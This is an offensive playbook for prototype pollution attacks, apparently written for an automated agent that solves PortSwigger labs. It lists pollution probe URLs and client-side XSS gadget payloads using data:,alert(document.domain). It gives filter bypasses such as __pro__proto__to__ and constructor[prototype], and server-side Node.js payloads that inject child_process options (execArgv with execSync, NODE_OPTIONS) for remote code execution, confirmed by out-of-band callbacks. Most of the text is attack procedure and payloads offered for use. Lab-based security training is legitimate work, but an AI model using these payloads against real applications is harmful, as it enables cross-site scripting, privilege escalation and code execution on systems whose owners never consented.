# Prototype Pollution Methodology
## Expert-Level Playbook (client-side + server-side, source → gadget → sink)

> 10 PortSwigger labs. Pollute `Object.prototype` via `__proto__` /
> `constructor.prototype` so an attacker-controlled property leaks into code
> that reads an undefined property later. Three steps every time: find a
> **source**, confirm the **prototype** is polluted, then find a **gadget**
> that turns the polluted property into impact (DOM XSS, config override, RCE).

---

## Phase 1: Client-Side Prototype Pollution

### 1.1 Sources (where input reaches an object merge/assign)
- URL query/hash parsed into an object (`?__proto__[x]=y`, `#__proto__[x]=y`)
- JSON `POST` body deep-merged into config
- Common vulnerable helpers: `location.hash` parsers, `deparam`, `$.extend(true,...)`,
  `jQuery.parseParams`, `lodash.merge/set/defaultsDeep` (old), `Object.assign` chains

### 1.2 Confirm the source (use the probe set)
```
# exploit_primitives.prototype_pollution_probes(base) yields:
?__proto__[reynardpp]=polluted
?__proto__.reynardpp=polluted
?constructor[prototype][reynardpp]=polluted
```
Then in DevTools / `browser_execute_js`:
```js
Object.prototype.reynardpp    // "polluted" ⇒ source confirmed
```
Use `browser_navigate` to the polluted URL, then `browser_execute_js` to read
`Object.prototype.<prop>`.

### 1.3 Find the gadget (property read unsafely → sink)
Search JS bundles (`extract_js_endpoints`, browser sources) for reads of
undefined properties fed into DOM sinks. Known gadgets:
```
__proto__[transport_url]=data:,alert(document.domain)     // script src gadget
__proto__[src]=data:,alert(document.domain)
__proto__[hitCallback]=alert(document.domain)             // analytics callback
__proto__[sequence]=alert(document.domain)
__proto__[value]=...&__proto__[onerror]=...               // config-driven element
```
`exploit_primitives.CLIENT_PP_GADGETS` enumerates working prop/value pairs.

### 1.4 Deliver
Chain source+gadget into one URL and deliver via the exploit server
(`xss_delivery_page` / navigation) so it runs in the victim context.

---

## Phase 2: Server-Side Prototype Pollution (Node.js)

Harder — no direct DOM feedback. Detect via **behavioral/side-channel** changes.

### 2.1 Sources
JSON request bodies merged into options objects. Send:
```
prototype_pollution_json("<prop>", <value>)      # {"__proto__":{"prop":"value"}}
prototype_pollution_constructor_json(...)         # filter bypass
```

### 2.2 Detection techniques (no reflection)
- **Status/param reflection**: pollute a property the framework echoes (e.g.
  `{"__proto__":{"json spaces":10}}` reformats JSON responses with indentation
  → visible whitespace change confirms pollution).
- **Unexpected 500/param acceptance**: pollute `__proto__` with a property that
  changes routing/validation and diff the response (`capture_baseline` /
  `diff_against_baseline`).
- **OOB via option injection**: pollute a property used to build a command/URL
  so the server makes a callback (`oob_get_domain` / `oob_poll`).

### 2.3 Escalation to RCE (Node)
Pollute properties consumed by `child_process.spawn`/`fork` option objects:
```
{"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=...","argv0":"..."}}
{"__proto__":{"execArgv":["--eval=require('child_process').execSync('...')"]}}
```
Trigger a code path that spawns a child process; confirm via OOB callback.

---

## Phase 3: PortSwigger Sub-variant Tips

| Sub-variant | Key move |
|-------------|----------|
| Client-side PP via URL | `?__proto__[x]=y`, confirm `Object.prototype.x` |
| DOM XSS via client PP | gadget → `script.src`/`config` sink → `data:` payload |
| PP in external library | fingerprint the lib version; use its known gadget |
| Bypass flawed sanitization | use `constructor.prototype` when `__proto__` is stripped; or `__pro__proto__to__` recursive-strip bypass |
| Server-side PP (privilege) | pollute `isAdmin`/role flag, hit a check that reads it |
| Server-side PP → RCE | spawn-option gadget, prove with OOB |
| PP via `Object.defineProperty` gap | use bracket + dotted forms both |

### Sanitization bypasses
```
__pro__proto__to__[x]=y        // survives a single non-recursive __proto__ strip
constructor[prototype][x]=y    // when __proto__ key is blocked
{"__proto__":{"__proto__":{...}}}  // nested
```

---

## Phase 4: Tooling

```
browser_navigate / browser_execute_js   # confirm Object.prototype pollution
extract_js_endpoints                     # find gadget property reads
http_request                             # send JSON PP bodies
capture_baseline / diff_against_baseline # server-side behavioral detection
oob_get_domain / oob_poll                # blind server-side / RCE proof
# exploit_primitives: prototype_pollution_url / _json / _constructor_json / _probes
```

## Common Failure Modes & Solutions

| Problem | Solution |
|---------|----------|
| Source works, no impact | Enumerate gadgets in JS bundles; pollution alone isn't a finding |
| `__proto__` filtered | Use `constructor.prototype` or recursive-strip bypass |
| No DOM feedback (SSPP) | Use JSON-spaces / status-diff / OOB side channels |
| Pollution not persistent | It resets per request; pollute+trigger in the same flow |
| Property overwritten | Choose a property the target reads *after* your pollution |

## Validation / Success Criteria
- [ ] `Object.prototype.<prop>` (client) or a behavioral side-channel (server)
      proves the prototype was polluted.
- [ ] A separate gadget consumes the polluted property for real impact.
- [ ] Control input without `__proto__` does not reproduce the effect.
- [ ] Lab solved banner observed.
